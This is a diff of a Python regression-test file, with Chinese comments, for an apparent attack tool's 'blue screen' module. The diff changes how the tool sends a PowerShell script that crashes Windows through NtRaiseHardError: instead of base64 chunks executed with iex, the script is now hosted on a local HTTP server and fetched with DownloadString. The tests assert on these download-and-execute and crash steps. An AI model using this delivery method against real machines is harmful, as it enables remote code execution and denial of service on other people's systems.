@@ -1,6 +1,6 @@
-"""蓝屏脚本分片组装的离线回归测试。"""
+"""蓝屏脚本托管与报文组装的离线回归测试。"""
 
-import base64
+import urllib.request
 
 import app.packets.blue_screen as blue_screen
 import app.packets.codec as codec
@@ -40,36 +40,42 @@ class BlueScreenTests(OfflineCase):
         self.assertEqual(constants.BLUE_SCREEN_PRIVILEGE, 19)
         self.assertEqual(constants.BLUE_SCREEN_RESPONSE, 6)
 
-    def test_payload_hint_reports_packet_count(self):
+    def test_payload_hint_reports_single_packet(self):
         hint = blue_screen.payload_hint()
         self.assertIn("NtRaiseHardError", hint)
-        self.assertIn("%d 条" % len(blue_screen.blue_screen_commands()), hint)
+        self.assertIn("报文 1 条", hint)
 
-    def test_commands_fit_single_command_channel(self):
-        commands = blue_screen.blue_screen_commands()
-        limit = constants.COMMAND_MAX_BYTES // 2
-        for index, command in enumerate(commands):
-            with self.subTest(index=index):
-                self.assertLessEqual(len(command), limit)
+    def test_packets_are_one_command_packet(self):
+        self.network_guard.stop()
+        self.addCleanup(self.network_guard.start)
+        command = blue_screen.blue_screen_command("127.0.0.1")
+        self.assertIn("DownloadString", command)
+        self.assertIn(constants.BLUE_SCREEN_PATH, command)
+        self.assertLessEqual(len(command), constants.COMMAND_MAX_BYTES // 2)
+        packets = blue_screen.blue_screen_packets("127.0.0.1")
+        self.assertEqual(len(packets), 1)
+        self.assertEqual(packets[0], codec.pkg_sendlist("-c", command))
 
-    def test_first_command_writes_and_last_command_runs(self):
-        commands = blue_screen.blue_screen_commands()
-        self.assertIn("Set-Content", commands[0])
-        self.assertNotIn("Add-Content", commands[0])
-        for command in commands[1:-1]:
-            self.assertIn("Add-Content", command)
-        self.assertIn("iex", commands[-1])
-        self.assertIn("FromBase64String", commands[-1])
+    def test_server_serves_the_script_once(self):
+        # 服务用例走真实回环连接，先临时放开网络守卫。
+        self.network_guard.stop()
+        self.addCleanup(self.network_guard.start)
+        server = blue_screen.BlueScreenServer("127.0.0.1").start()
+        try:
+            with urllib.request.urlopen(server.url, timeout=5) as response:
+                body = response.read().decode("utf-8")
+            self.assertEqual(body, constants.BLUE_SCREEN_SCRIPT)
+            self.assertTrue(server.wait(5))
+            self.assertGreater(server.port, 0)
+        finally:
+            server.close()
+        self.assertTrue(server.closed)
 
-    def test_chunks_decode_back_to_script(self):
-        chunks = []
-        for command in blue_screen.blue_screen_commands()[:-1]:
-            start = command.index("'") + 1
-            chunks.append(command[start:-2])
-        decoded = base64.b64decode("".join(chunks)).decode("utf-8")
-        self.assertEqual(decoded, constants.BLUE_SCREEN_SCRIPT)
-
-    def test_packets_are_command_packets(self):
-        commands = blue_screen.blue_screen_commands()
-        expected = [codec.pkg_sendlist("-c", command) for command in commands]
-        self.assertEqual(blue_screen.blue_screen_packets(), expected)
+    def test_wait_times_out_without_a_fetch(self):
+        self.network_guard.stop()
+        self.addCleanup(self.network_guard.start)
+        server = blue_screen.BlueScreenServer("127.0.0.1").start()
+        try:
+            self.assertFalse(server.wait(0.1))
+        finally:
+            server.close()
